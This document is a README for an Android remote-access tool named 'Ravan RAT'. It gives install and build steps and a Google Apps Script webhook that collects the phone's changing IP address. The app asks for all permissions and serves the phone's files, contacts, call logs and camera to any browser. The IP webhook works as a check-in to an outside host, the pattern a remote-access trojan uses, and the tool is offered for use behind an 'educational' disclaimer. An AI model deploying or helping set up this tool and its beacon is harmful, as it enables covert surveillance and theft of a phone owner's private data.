# 🔥 Ravan RAT

A simple Android app that runs a remote server on your phone accessible via IPv6.

## 🚀 How to Use

1. **Install** the APK on your Android phone.
2. **Open** the app and grant all permissions (Storage, Contacts, Camera, etc.).
3. Tap **Start Server**.
4. You will see a URL like `http://[2405:201:...]:8080`.
5. Enter that URL in a browser on any other device to access files, contacts, call logs, and camera.

---

## 📊 Automatic IP Reporting (Google Sheets)

Since IPv6 addresses change often, you can set up a Google Sheet to automatically receive your phone's latest public IP address.

### Step 1: Set up Google Sheet

1. Create a new [Google Sheet](https://sheets.google.com).
2. Write these headers in the first row:
   `Timestamp` | `IP Address` | `Port` | `Device`

### Step 2: Add the Script

1. In your Google Sheet, click **Extensions** > **Apps Script**.
2. Delete everything and paste this code:
   ```javascript
   function doPost(e) {
     var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
     var data = JSON.parse(e.postData.contents);
     sheet.appendRow([new Date(), data.ip, data.port, data.device]);
     return ContentService.createTextOutput(
       JSON.stringify({ status: "success" }),
     );
   }
   ```
3. Click **Deploy** (blue button) > **New Deployment**.
4. Click the gear icon ⚙️ > **Web App**.
5. Set **Who has access** to **Anyone** (Important!).
6. Click **Deploy** and **Copy** the Web App URL.

### Step 3: Connect to App

1. Open the project folder on your computer.
2. Create or open the file named `local.properties`.
3. Add your URL inside it like this:
   ```properties
   WEBHOOK_URL=https://script.google.com/macros/s/YOUR-LONG-URL-HERE/exec
   ```
4. Build and install the app. Now, whenever your internet changes, the new IP will appear in your Google Sheet!

---

## 🛠️ Build from Source

1.  Ensure you have JDK 11+ and Android SDK installed.
2.  Clone the repo.
3.  Create `local.properties` with your `sdk.dir` and optionally `WEBHOOK_URL`.
4.  Run:
    ```bash
    ./gradlew clean assembleRelease
    ```
5.  Find your APK in `app/build/outputs/apk/release/`.

---

## ⚠️ Disclaimer

This tool is for **Educational Purpose Only**.
